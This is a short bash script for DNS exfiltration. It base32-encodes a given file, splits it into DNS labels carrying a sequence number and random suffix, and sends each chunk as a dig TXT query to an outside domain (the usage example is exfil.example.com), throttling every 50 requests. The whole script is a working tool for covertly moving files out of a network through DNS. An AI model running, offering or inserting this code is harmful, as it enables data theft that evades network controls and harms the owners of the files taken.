#!/bin/bash
# This script is to upload a file to the dns server
# Requires two arguments:
# the file to upload, and the domain the name server is sitting at
# Usage: 
# fileupload.sh /path/to/file exfil.example.com

# Check for dependancies
# Dont actually expect any of these to be missing 
# maybe on barebones machines running containers
if ! which base32 &> /dev/null ; then
	echo "Missing base32" 
	exit
fi 
if ! which tr &> /dev/null ; then
	echo "Missing tr" 
	exit
fi 
if ! which cat &> /dev/null ; then
	echo "Missing cat" 
	exit
fi 
if ! which sed &> /dev/null ; then
	echo "Missing sed" 
	exit
fi 

if ! [ $2 ]; then 
	echo "This script takes two args: filename and domain name" 
fi

# Generate a random string to make sure the domains wont be cached 
# Also acts as filename to do multiple concurrent file uploads to one server
filesuffix=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10 | head -n 1) 
domain=$(echo "ex." "$2" | sed 's/ //g') 
index=0
output=$(cat $1 | base32 -w 63 | tr '[:upper:]' '[:lower:]' | sed "s/\$/.NUM.$filesuffix.$domain/" | sed 's/=/1/g')
linestot=$(echo "$output" | wc -l) 
echo "This file will take $linestot dns requests" 

# Starting file request 
echo "start-$linestot.$filesuffix.$domain"
#dig "start-$linestot.000.$filesuffix.$domain" @localhost TXT &> /dev/null 
dig +short "start-$linestot.000.$filesuffix.$domain" TXT 

while read -r line ; do 
	line=$(echo -n "$line" | sed "s/NUM/$index/")
	index=$(( $index + 1 ))
	if ! (( $index % 50 )) ; then
		sleep 1 # some breathing room every 50 requests, may need adjusting
	fi 
	echo "$line"
	#dig $line @localhost TXT &> /dev/null & 
	dig +short $line TXT &> /dev/null &
done <<< $(echo "$output")

wait
